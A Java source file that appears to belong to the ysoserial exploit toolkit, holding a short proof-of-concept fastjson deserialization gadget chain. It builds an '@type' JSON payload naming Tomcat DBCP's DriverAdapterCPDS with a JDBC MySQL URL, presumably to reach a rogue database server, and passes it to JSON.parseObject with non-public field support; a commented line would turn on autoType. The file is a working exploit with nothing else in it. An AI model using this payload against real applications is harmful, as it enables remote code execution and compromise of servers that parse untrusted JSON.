package ysoserial.payloads.tabbyGadgetChains.tomcat;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

public class Poc2 {
    public static void main(String[] args) {
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String poc=  "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.cpdsadapter.DriverAdapterCPDS\",\"url\":\"jdbc:mysql://127.0.0.1:8990/test\"}";
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
